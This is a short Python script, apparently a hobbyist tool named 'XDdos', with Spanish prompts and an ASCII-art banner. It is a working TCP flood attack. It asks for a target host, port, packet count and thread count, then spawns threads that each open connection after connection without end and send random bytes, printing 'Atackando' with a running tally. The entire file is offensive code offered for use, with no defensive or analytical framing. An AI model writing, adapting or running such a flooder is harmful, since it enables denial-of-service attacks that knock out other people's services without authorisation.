#!/usr/bin/env python
# -*- coding: utf-8 -*-
import os
import socket
import random
import threading
from colorama import Back, Fore, Style, init
init()
#importacion de libs

verde = Fore.GREEN
rojo = Fore.RED
cyan = Fore.CYAN
amarillo = Fore.YELLOW
magenta = Fore.MAGENTA
stylo = Style.BRIGHT
azul = Fore.BLUE
#variables colorama

os.system("clear")
#borron cuenta nueva
print(cyan +"""
        BIENVENIDO A XDdos

     _.-^^---....,,--       
 _--                  --_  
<       T3nshi           >)
|                         | 
 \._                   _./  
    ```--. . , ; .--'''       
          | |   |             
       .-=||  | |=-.   
       `-=#$%&%$#=-'   
          | ;  :|     
 _____.,-#%&$@%#&#~,._____

""")
#fin banner

#data ddos
Lhost = str(input(stylo + rojo +'[+] Lhost: '+ azul))
Lport = int(input(stylo + rojo +'[+] Lport: '+ azul))
Pack = int(input(stylo + rojo +'[+] Packequets: '+ azul))
time = int(input(stylo + rojo +'[+] Tiempo: '+ azul))

#Sockets fun
def start():
    bvb = random._urandom(10)
    ffr = int(0)
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((Lhost,Lport))
            s.send(bvb)
            for i in range(Pack):
                s.send(bvb)
            ffr += 1
            print(stylo + rojo +'Atackando > '+magenta +Lhost+ rojo +' | enviado: '+ verde +str(ffr))
        except:
            s.close()
            print('Done')
for x in range(time):
    time = threading.Thread(target=start)
    time.start()

